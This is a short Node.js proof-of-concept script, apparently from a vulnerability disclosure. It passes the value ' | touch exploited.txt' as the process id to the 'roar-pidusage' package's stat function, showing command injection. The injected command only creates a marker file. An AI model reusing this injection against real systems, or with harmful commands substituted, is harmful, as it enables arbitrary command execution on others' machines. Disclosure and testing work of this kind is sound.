
const pkg = require('roar-pidusage');

const payload = " | touch exploited.txt";

console.log(pkg);

const pid = payload;

const options = {

};

const cb = function(error, data) {

};

pkg.stat(pid, options, cb);